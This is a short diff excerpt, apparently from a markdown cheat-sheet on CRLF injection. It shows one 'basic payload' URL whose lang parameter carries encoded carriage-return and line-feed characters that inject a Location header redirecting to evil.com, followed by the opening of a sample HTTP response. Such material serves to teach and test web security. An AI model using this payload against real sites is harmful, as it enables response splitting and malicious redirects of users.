@@ -10,9 +10,8 @@ It can be found anywhere, always check the request and response. Try to search f
 1. Basic payload
 ```
 https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 200 OK
 Content-Type: text/html
 Date: Mon, 09 May 2016 14:47:29 GMT
